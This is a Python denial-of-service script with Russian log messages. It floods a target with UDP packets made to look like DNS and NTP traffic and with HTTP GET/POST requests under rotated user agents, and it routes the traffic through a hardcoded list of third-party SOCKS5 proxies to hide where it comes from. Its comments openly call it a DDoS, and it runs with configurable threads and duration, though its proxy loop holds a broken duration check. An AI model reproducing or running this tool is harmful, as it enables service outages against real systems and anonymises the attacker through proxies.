import socket
import random
import threading
import time
import socks
from urllib.parse import urlparse

USE_PROXY = True  # Set to False to DDoS without proxies

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Android 10; Mobile; LG-M255) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
    "Mozilla/5.0 (Android 11; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (iPad; CPU OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 10; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/90.0.818.62 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Mozilla/5.0 (Android 10; Tablet; rv:88.0) Gecko/88.0 Firefox/88.0",
    "Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SM-J337A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.55 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 10; Mobile; rv:90.0) Gecko/90.0 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (iPad; CPU OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 9; Mobile; rv:87.0) Gecko/87.0 Firefox/87.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/93.0.961.38 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/94.0.992.50 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 10; Mobile; rv:92.0) Gecko/92.0 Firefox/92.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]

def load_proxies(file_path):
    default_proxies = [
        "socks5://185.93.89.168:5466",
        "socks5://185.93.89.168:5714",
        "socks5://103.174.102.183:1080",
        "socks5://45.228.233.146:1080",
        "socks5://103.146.170.252:1080",
        "socks5://103.105.67.244:4145",
        "socks5://103.47.92.65:1080",
        "socks5://103.75.196.121:4145",
        "socks5://103.231.35.10:5678",
        "socks5://103.146.222.3:1080",
        "socks5://103.81.214.254:1080"
    ]
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    proxies.append(line)
        print(f"Загружено {len(proxies)} прокси из {file_path}")
        return proxies
    except FileNotFoundError:
        print(f"Ошибка: {file_path} не найден. Используется стандартный список прокси SOCKS5.")
        return default_proxies

def parse_proxy(proxy):
    try:
        parsed = urlparse(proxy)
        if parsed.scheme != 'socks5':
            print(f"Неверная схема прокси: {proxy}")
            return None
        ip = parsed.hostname
        port = parsed.port
        username = parsed.username
        password = parsed.password
        if not ip or not port:
            print(f"Неверный формат прокси: {proxy}")
            return None
        return ip, port, username, password
    except Exception as e:
        print(f"Ошибка парсинга прокси {proxy}: {e}")
        return None

def get_random_proxy(proxies):
    return random.choice(proxies) if proxies else None

def generate_random_path():
    """Generate a random URL path for HTTP requests"""
    paths = ["/", "/index", "/about", "/contact", "/api/v1/data", "/login", "/profile", "/search"]
    return random.choice(paths) + f"?q={random.randint(1000, 9999)}"

def generate_pseudo_packet():
    """Generate pseudo-random data resembling DNS or NTP packets"""
    packet_types = [
        b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + random._urandom(20),  # Pseudo-DNS query
        b"\xe3\x00\x04\xfa\x00\x00\x00\x00" + random._urandom(20),  # Pseudo-NTP packet
        random._urandom(random.randint(64, 128))  # Random data
    ]
    return random.choice(packet_types)

def udp_flood(target_ip, target_port, proxy=None, stop_event=None):
    packet_count = 0
    try:
        sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM) if USE_PROXY else socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if USE_PROXY and proxy:
            proxy_info = parse_proxy(proxy)
            if not proxy_info:
                print(f"Пропуск неверного прокси: {proxy}")
                return
            ip, port, username, password = proxy_info
            if username and password:
                sock.set_proxy(socks.SOCKS5, ip, port, username=username, password=password)
            else:
                sock.set_proxy(socks.SOCKS5, ip, port)
        while not stop_event.is_set():
            sock.bind(('', random.randint(1024, 65535)))
            current_port = random.randint(target_port, 65535) if random.random() > 0.5 else target_port
            for _ in range(random.randint(1, 3)):
                packet = generate_pseudo_packet()
                sock.sendto(packet, (target_ip, current_port))
                packet_count += 1
                if packet_count % 100 == 0:
                    log_msg = f"[UDP] отправлено {packet_count} пакетов"
                    if USE_PROXY and proxy:
                        log_msg += f" via {proxy}"
                    print(log_msg)
                time.sleep(random.uniform(0.01, 0.05))
            if USE_PROXY and packet_count % 500 == 0:
                break
    except Exception as e:
        print(f"Ошибка UDP-флуда{' с прокси ' + proxy if USE_PROXY and proxy else ''}: {e}")

def tcp_flood(target_ip, target_port, proxy=None, stop_event=None):
    packet_count = 0
    try:
        sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM) if USE_PROXY else socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if USE_PROXY and proxy:
            proxy_info = parse_proxy(proxy)
            if not proxy_info:
                print(f"Пропуск неверного прокси: {proxy}")
                return
            ip, port, username, password = proxy_info
            if username and password:
                sock.set_proxy(socks.SOCKS5, ip, port, username=username, password=password)
            else:
                sock.set_proxy(socks.SOCKS5, ip, port)
        sock.connect((target_ip, target_port))
        while not stop_event.is_set():
            # Simulate HTTP GET/POST request
            method = random.choice(["GET", "POST"])
            path = generate_random_path()
            user_agent = random.choice(USER_AGENTS)
            packet = f"{method} {path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\nConnection: keep-alive\r\n\r\n".encode()
            sock.send(packet)
            packet_count += 1
            if packet_count % 100 == 0:
                log_msg = f"[TCP] отправлено {packet_count} пакетов"
                if USE_PROXY and proxy:
                    log_msg += f" via {proxy}"
                print(log_msg)
            time.sleep(random.uniform(0.05, 0.2))  # Random delay
            # Rotate proxy every 10 seconds if using proxies
            if USE_PROXY and packet_count % 1000 == 0:
                break
    except Exception as e:
        print(f"Ошибка TCP-флуда{' с прокси ' + proxy if USE_PROXY and proxy else ''}: {e}")

def attack(target_ip, target_port, proxies, duration, num_udp_threads=10, num_tcp_threads=10):
    stop_event = threading.Event()
    threads = []
    if USE_PROXY:
        if not proxies:
            print("Нет доступных прокси. Выход.")
            return
        while not stop_event.is_set():
            # Create new threads with fresh proxies
            for i in range(num_udp_threads):
                proxy = get_random_proxy(proxies)
                t = threading.Thread(target=udp_flood, args=(target_ip, target_port, proxy, stop_event))
                threads.append(t)
            for i in range(num_tcp_threads):
                proxy = get_random_proxy(proxies)
                t = threading.Thread(target=tcp_flood, args=(target_ip, target_port, proxy, stop_event))
                threads.append(t)
            for t in threads:
                t.start()
            time.sleep(5 if num_udp_threads > 0 else 10)
         
            for t in threads:
                t.join()
            threads = []
            if time.time() >= time.time() + duration:
                break
    else:
        for i in range(num_udp_threads):
            t = threading.Thread(target=udp_flood, args=(target_ip, target_port, None, stop_event))
            threads.append(t)
        for i in range(num_tcp_threads):
            t = threading.Thread(target=tcp_flood, args=(target_ip, target_port, None, stop_event))
            threads.append(t)
        for t in threads:
            t.start()
    
    time.sleep(duration)
    
    stop_event.set()
    
    for t in threads:
        t.join()
    print("Атака завершена.")

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # IP
    target_port = 7777
    proxy_file = "proxies.txt"  # Путь к файлу с прокси
    proxies = load_proxies(proxy_file) if USE_PROXY else []
    attack_duration = 300  # 5 минут
    attack(target_ip, target_port, proxies, attack_duration, num_udp_threads=10, num_tcp_threads=10)
